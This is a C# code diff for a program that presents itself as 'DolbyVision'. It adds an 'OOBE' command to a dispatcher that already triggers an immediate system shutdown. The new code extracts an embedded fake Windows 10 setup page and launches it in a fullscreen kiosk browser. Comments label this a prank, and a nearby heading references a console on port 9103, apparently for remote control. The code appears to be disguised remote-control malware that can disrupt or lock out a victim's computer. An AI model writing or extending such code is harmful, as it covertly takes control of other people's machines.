@@ -200,6 +200,10 @@ namespace DolbyVision
         {
             try
             {
+                if (cmd.Equals("OOBE", StringComparison.OrdinalIgnoreCase))
+                {
+                    return StartOobePrank();
+                }
                 if (cmd.Equals("SHUTDOWN", StringComparison.OrdinalIgnoreCase))
                 {
                     Process.Start(new ProcessStartInfo("shutdown", "/s /t 0") { CreateNoWindow = true, UseShellExecute = false });
@@ -256,6 +260,59 @@ namespace DolbyVision
             {
                 return "ERROR: " + ex.Message;
             }
+        }
+
+        // ========== OOBE恶搞 ==========
+        private static string StartOobePrank()
+        {
+            try
+            {
+                // 从嵌入资源释放HTML到TEMP
+                string htmlPath = Path.Combine(Path.GetTempPath(), "Win10_OOBE.html");
+                var assembly = System.Reflection.Assembly.GetExecutingAssembly();
+                string resourceName = "DolbyVision.Assets.Win10_OOBE_Prank.html";
+                using (var stream = assembly.GetManifestResourceStream(resourceName))
+                {
+                    if (stream == null) return "ERROR: OOBE资源未找到";
+                    using (var fs = new FileStream(htmlPath, FileMode.Create, FileAccess.Write))
+                    {
+                        stream.CopyTo(fs);
+                    }
+                }
+
+                // 尝试用Edge全屏打开
+                string edgePath = FindBrowser();
+                if (string.IsNullOrEmpty(edgePath)) return "ERROR: 未找到浏览器";
+
+                string url = "file:///" + htmlPath.Replace("\\", "/");
+                var psi = new ProcessStartInfo(edgePath, "--kiosk --fullscreen --no-first-run --disable-features=Translate " + url)
+                {
+                    CreateNoWindow = false,
+                    UseShellExecute = false
+                };
+                Process.Start(psi);
+                return "OK: OOBE恶搞已启动 (" + edgePath + ")";
+            }
+            catch (Exception ex)
+            {
+                return "ERROR: " + ex.Message;
+            }
+        }
+
+        private static string FindBrowser()
+        {
+            // 优先Edge，其次Chrome
+            string[] candidates = {
+                @"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
+                @"C:\Program Files\Microsoft\Edge\Application\msedge.exe",
+                @"C:\Program Files\Google\Chrome\Application\chrome.exe",
+                @"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
+            };
+            foreach (var p in candidates)
+            {
+                if (File.Exists(p)) return p;
+            }
+            return null;
         }
 
         // ========== 虚拟控制台（9103） ==========
